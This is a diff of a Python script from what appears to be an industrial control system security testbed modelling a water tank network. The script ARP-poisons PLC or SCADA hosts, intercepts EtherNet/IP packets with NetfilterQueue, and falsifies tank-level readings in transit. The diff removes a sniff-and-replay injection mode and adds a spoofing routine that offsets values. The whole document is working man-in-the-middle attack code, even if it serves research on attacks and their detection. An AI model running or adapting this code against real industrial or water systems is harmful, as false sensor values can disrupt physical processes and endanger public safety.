@@ -8,7 +8,7 @@ import sys
 import os
 import time
 
-from ips import IP
+from ips import PLC_IPS
 
 import sqlite3
 
@@ -30,76 +30,32 @@ spoof_attack_counter = 0
 
 nfqueue = NetfilterQueue()
 
-def sniff(value):
-
-    print ("In sniff------------")
-    sniffed_packet.append(value)
-    c.execute("UPDATE minitown SET value = 1 WHERE name = 'ATT_1'")
-    conn.commit()
-
-    if len(sniffed_packet) == 60:
-        global injection_phase
-        injection_phase = 1
-
-def spoof(raw):
-    print("Spoofing-----------")
-    float_value = translate_load_to_float(raw)*0.01
-    fake_value = float_value
-    c.execute("UPDATE minitown SET value = 4 WHERE name = 'ATT_1'")
-    conn.commit()
-    pay = translate_float_to_load(fake_value, raw[0], raw[1])
-    return pay
-
-def injection(raw):
-    print ("In injection-----------")
-    float_value = translate_load_to_float(raw)
-    fake_value = sniffed_packet[0] + float_value
-    sniffed_packet.pop(0)
-    c.execute("UPDATE minitown SET value = 4 WHERE name = 'ATT_1'")
-    conn.commit()
-    pay = translate_float_to_load(fake_value, raw[0], raw[1])
-    return pay
 
 def spoof_value(raw):
-    print ("Spooging-----------")
-    fake_value = float(4.9)
+    print ("Spoofing-----------")
+    float_value = translate_load_to_float(raw)
+    fake_value = float_value + 2.9
     c.execute("UPDATE minitown SET value = 3 WHERE name = 'ATT_1'")
     conn.commit()
     pay = translate_float_to_load(fake_value, raw[0], raw[1])
     return pay
 
 def capture(packet):
-    global injection_phase
+    print("Packet...")
+    c.execute("UPDATE minitown SET value = 1 WHERE name = 'ATT_1'")
+    conn.commit()
     pkt = IP(packet.get_payload())
     if len(pkt) == 102:
         print("Capturing...")
         raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
-        float_value = translate_load_to_float(raw)
 
-        if sys.argv[1] == 'plc2':
-            if not injection_phase:
-                sniff(float_value)
-            else:
-                try:
-                    pay = injection(raw)
-                    pkt[Raw].load = pay  # This is an IP packet
-                    del pkt[TCP].chksum  # Needed to recalculate the checksum
-                    packet.set_payload(str(pkt))
-
-                except IndexError:
-                    print("sniffed packets finished")
-                    __setdown(enip_port)
-                    return 0
-
-        elif sys.argv[1] == 'plc5':
+        if sys.argv[1] == 'plc5':
             global spoof_attack_counter
             spoof_attack_counter += 1
             pay = spoof_value(raw)
             pkt[Raw].load = pay  # Replace the tank level with the spoofed one
             del pkt[TCP].chksum  # Needed to recalculate the checksum
             packet.set_payload(str(pkt))
-            c.execute("UPDATE minitown SET value = 4 WHERE name = 'ATT_1'")
-            conn.commit()
 
             if spoof_attack_counter > 100:
                 print("Attack finished")
@@ -107,33 +63,6 @@ def capture(packet):
                 spoof_phase = 0
                 __setdown(enip_port)
                 return 0
-
-        elif sys.argv[1] == 'scada':
-            # Get T_LVL if its below 0.5 and t<500, spoof (t is inferred from the launch time and the approximate time physical process gets to t=500)
-            global spoof_counter
-            spoof_counter += 1
-            print ("spoof counter %d" % spoof_counter)
-            float_value = translate_load_to_float(raw)
-            if float_value <= 0.5 and spoof_counter <=240:
-                global spoof_phase
-                spoof_phase = 1
-
-            if spoof_phase == 1:
-                global spoof_attack_counter
-                spoof_attack_counter += 1
-                pay = spoof(raw)
-                pkt[Raw].load = pay  # This is an IP packet
-                del pkt[TCP].chksum  # Needed to recalculate the checksum
-                packet.set_payload(str(pkt))
-
-                if spoof_attack_counter > 60:
-                    print("Attack finished")
-                    global spoof_phase
-                    spoof_phase = 0
-                    __setdown(enip_port)
-                    return 0
-
-
     packet.accept()
 
 
@@ -154,9 +83,10 @@ def start():
     __setup(enip_port)
     nfqueue.bind(0, capture)
     try:
-        print("[*] starting water level spoofing")
+        print("[*] Starting water level spoofing")
         nfqueue.run()
     except KeyboardInterrupt:
+        print("[*] Finished attack process")
         __setdown(enip_port)
     return 0
 
@@ -182,12 +112,12 @@ def __setdown(port):
     os.system(cmd)
 
     nfqueue.unbind()
-    print("[*] stopping water level spoofing")
+    print("[*] Stopping water level spoofing")
     c.execute("UPDATE minitown SET value = 0 WHERE name = 'ATT_1'")
     conn.commit()
 
 def launch_arp_poison():
-    print("[*] launching arp poison on " + sys.argv[1])
+    print("[*] Launching arp poison on " + PLC_IPS[sys.argv[1]])
 
     if sys.argv[1] == 'scada':
         # SCADA Mitm attack
@@ -195,9 +125,8 @@ def launch_arp_poison():
         sourceip = "192.168.2.254"
     else:
         # PLC2 MiTm attack
-        targetip = IP[sys.argv[1]]
-        #targetip = "192.168.1.50"
-        sourceip = "192.168.1.10"
+        targetip = PLC_IPS[sys.argv[1]]
+        sourceip = PLC_IPS['plc9']
 
     arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
     targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
@@ -207,7 +136,7 @@ def launch_arp_poison():
 
     spoof_arp_cache(sourceip, sourcemac, targetip)
     spoof_arp_cache(targetip, targetmac, sourceip)
-    print("[*] network poisoned")
+    print("[*] Network poisoned")
 
 def spoof_arp_cache(targetip, targetmac, sourceip):
     spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
@@ -217,6 +146,7 @@ def spoof_arp_cache(targetip, targetmac, sourceip):
 if __name__ == '__main__':
     sleep_count = 0
     sleep_limit = 576
+    #sleep_limit = 3 #for debug onlyu
     print('[] Preparing attack')
     while sleep_count < sleep_limit:
         sleep_count += 1
